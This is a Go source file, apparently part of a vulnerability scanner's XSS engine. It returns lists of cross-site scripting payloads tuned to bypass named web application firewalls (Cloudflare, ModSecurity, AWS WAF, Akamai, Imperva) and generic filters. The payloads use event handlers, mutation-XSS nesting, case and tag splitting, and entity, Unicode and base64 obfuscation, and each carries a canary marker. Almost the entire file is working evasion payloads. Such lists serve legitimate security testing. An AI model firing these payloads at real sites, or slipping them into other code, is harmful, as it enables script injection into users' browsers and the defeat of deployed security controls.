package xssengine

import "fmt"

// ============================================================
//  WAF-SPECIFIC XSS BYPASS PAYLOADS
//  Cloudflare · ModSecurity · AWS WAF · Akamai · Imperva
// ============================================================

func getCloudflareBypassPayloads(canary string) []string {
	return []string{
		// Cloudflare-specific bypasses
		fmt.Sprintf(`<svg/onload=alert('%s')>`, canary),
		fmt.Sprintf(`<details/open/ontoggle=alert('%s')>`, canary),
		fmt.Sprintf(`<video><source onerror=alert('%s')>`, canary),
		fmt.Sprintf(`<svg><animate onbegin=alert('%s') attributeName=x>`, canary),
		fmt.Sprintf(`<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert('%s') src=1>">`, canary),
		fmt.Sprintf(`<a href="javascript&colon;alert('%s')">`, canary),
		fmt.Sprintf(`<input onfocus=alert('%s') autofocus>`, canary),
		fmt.Sprintf(`<img src=x onerror=alert`+"`"+"('%s')"+"`"+`>`, canary),
		fmt.Sprintf(`<svg><script>alert('%s')</script></svg>`, canary),
		fmt.Sprintf(`<xss onclick="alert('%s')">click`, canary),
	}
}

func getModSecurityBypassPayloads(canary string) []string {
	return []string{
		// ModSecurity CRS bypasses
		fmt.Sprintf(`<Img Src=x OnError=alert('%s')>`, canary),
		fmt.Sprintf(`<sVg OnLoAd=alert('%s')>`, canary),
		fmt.Sprintf(`<BODY ONLOAD=alert('%s')>`, canary),
		fmt.Sprintf(`<<script>alert('%s')//<</script>`, canary),
		fmt.Sprintf(`<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;('%s')">`, canary),
		fmt.Sprintf(`<svg/onload="\u0061lert('%s')">`, canary),
		fmt.Sprintf(`<iframe src="data:text/html,%%3Cscript%%3Ealert('%s')%%3C/script%%3E">`, canary),
		fmt.Sprintf(`<img src=x onerror=prompt('%s')>`, canary),
		fmt.Sprintf(`<img src=x onerror=confirm('%s')>`, canary),
	}
}

func getAWSBypassPayloads(canary string) []string {
	return []string{
		// AWS WAF bypasses
		fmt.Sprintf(`<img/src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`<svg	onload=alert('%s')>`, canary), // tab char
		fmt.Sprintf(`<details open ontoggle=alert('%s')>`, canary),
		fmt.Sprintf(`<body onpageshow=alert('%s')>`, canary),
		fmt.Sprintf(`%%3Csvg/onload=alert('%s')%%3E`, canary),
		fmt.Sprintf(`<marquee onstart=alert('%s')>`, canary),
		fmt.Sprintf(`<a href=javascript:alert('%s')>`, canary),
		fmt.Sprintf(`<svg><desc><![CDATA[</desc><svg/onload=alert('%s')>]]></svg>`, canary),
	}
}

func getAkamaiBypassPayloads(canary string) []string {
	return []string{
		// Akamai bypasses
		fmt.Sprintf(`<svg%%0Aonload=alert('%s')>`, canary),
		fmt.Sprintf(`<img src=x onerror%%09=%%09alert('%s')>`, canary),
		fmt.Sprintf(`<svg><script>%%61lert('%s')</script>`, canary),
		fmt.Sprintf(`<video><source onerror="alert('%s')">`, canary),
		fmt.Sprintf(`<style>*{background:url("javascript:alert('%s')")}</style>`, canary),
		fmt.Sprintf(`<input type=image src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`<isindex action=javascript:alert('%s') type=image>`, canary),
	}
}

func getImpervaBypassPayloads(canary string) []string {
	return []string{
		// Imperva/Incapsula bypasses
		fmt.Sprintf(`<svg/onload=alert('%s')>`, canary),
		fmt.Sprintf(`<img src=x onerror=alert('%s')//`, canary),
		fmt.Sprintf(`<details open ontoggle=alert('%s')>test</details>`, canary),
		fmt.Sprintf(`<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('%s') src=1>">`, canary),
		fmt.Sprintf(`<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=1 onerror=alert('%s') /></svg>#x" />`, canary),
		fmt.Sprintf(`<audio src onloadstart=alert('%s')>`, canary),
	}
}

func getGenericWAFBypassPayloads(canary string) []string {
	return []string{
		// Generic WAF bypass techniques
		fmt.Sprintf(`<ScRiPt>alert('%s')</ScRiPt>`, canary),                                                   // Case variation
		fmt.Sprintf(`<scr<script>ipt>alert('%s')</scr</script>ipt>`, canary),                                   // Tag splitting
		fmt.Sprintf(`<svg/onload=alert('%s')>`, canary),                                                        // No space
		fmt.Sprintf(`<img src=x onerror=alert('%s')>`, canary),                                                 // Different event
		fmt.Sprintf(`<img src=x onerror=al\u0065rt('%s')>`, canary),                                            // Unicode escape
		fmt.Sprintf(`<svg onload="javascript:alert('%s')">`, canary),                                           // Explicit proto
		fmt.Sprintf(`<details/open/ontoggle=alert('%s')>`, canary),                                             // Slash separator
		fmt.Sprintf(`<img src=x onerror=window['al'+'ert']('%s')>`, canary),                                    // String concat
		fmt.Sprintf(`<img src=x onerror=window.alert('%s')>`, canary),                                          // Explicit window
		fmt.Sprintf(`<img src=x onerror=self['alert']('%s')>`, canary),                                         // self reference
		fmt.Sprintf(`<svg><script>alert&lpar;'%s'&rpar;</script>`, canary),                                     // HTML entities in script
		fmt.Sprintf(`<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;('%s')">`, canary),                     // Hex entities
		fmt.Sprintf(`<img src=x onerror="eval(atob('YWxlcnQoJw==')+'%s'+atob('Jyk='))">`, canary),             // Base64
	}
}
